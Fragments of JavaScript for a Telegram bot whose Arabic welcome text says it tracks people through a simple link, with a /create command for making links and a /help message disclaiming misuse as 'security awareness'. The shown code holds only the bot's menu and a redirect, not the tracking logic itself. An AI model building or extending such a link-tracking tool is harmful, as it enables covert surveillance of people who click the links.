...
res.redirect("https://t.me/SCP_SCP106");
}
...
bot.sendMessage(chatId, `اهلا بك ${msg.chat.first_name} ! , \nيمكنك استخدام هذا الروبوت لتعقب الأشخاص من خلال رابط بسيط..\n , , .\n\n.`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,` تم صنع هذا بوت لأغراض توعيه امنيه و انا لست مسؤول عن اي سوء استخدام  .\n\nSend /create
...
\n\nThe project is OSS at: https:https://https://t.me/SCP_SCP106
`);
}
